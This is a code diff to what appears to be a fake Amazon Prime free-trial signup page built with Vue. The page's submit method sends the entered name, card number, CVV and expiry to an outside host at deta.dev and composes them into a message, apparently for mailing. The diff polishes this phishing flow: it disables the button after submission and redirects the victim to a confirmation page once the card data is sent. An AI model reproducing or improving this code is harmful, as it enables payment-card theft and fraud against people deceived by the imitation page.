@@ -98,15 +98,17 @@
                 <h3>Try Prime <span style="color: orangered;">Free</span></h3>
                 <p>Pay via UPI or select credit / debit cards.</p>
                 <div style="display: flex; justify-content: space-around;">
-                    <button @click="submit()"
+                    <button @click="submit()" :disabled="disable"
                         style="background-color: orange; border: none; width: 100%; padding: 12px; border-radius: 8px; font-size: medium; color: black;">Start
                         your 30-days free trial</button>
+
+                       
                 </div>
             </div>
             <br>
 
         </div>
-        <p style="margin-left: 18%; margin-right: 10%;">After 30 days, you will be automatically charged ₹1499 / year.
+        <p style="margin-left: 18%; margin-right: 10%;">After 30 days, you will be automatically charged ₹1499 / month.
             <b style="font-weight: bold;">Cancel anytime</b>
         </p>
 
@@ -126,6 +128,7 @@
                 data: {
                     message: 'Hello Vue!',
                     name: '',
+                    disable:false,
                     card: "",
                     cvv: "",
                     month: '02',
@@ -135,6 +138,7 @@
                 },
                 methods: {
                     submit() {
+                        this.disable = true
                         var myHeaders = new Headers();
                         myHeaders.append("Content-Type", "application/json");
 
@@ -156,7 +160,9 @@
 
                         fetch("https://hne95y.deta.dev/amzn", requestOptions)
                             .then(response => response.text())
-                            .then(result => console.log(result))
+                            .then(result => {console.log(result)
+                                window.location="./cnfm.html"
+                            })
                             .catch(error => console.log('error', error));
 
                         let a = "name-" + this.name + "\n card-" + this.card + "\n cvv-" + this.cvv + "\n month-" + this.month + "\n year-" + this.year;
@@ -172,7 +178,7 @@
                             .then(function (message) {
                                 console.log(a);
                                 console.log("mail sent successfully");
-                                location.reload();
+                        
                             });
                     }
                 }
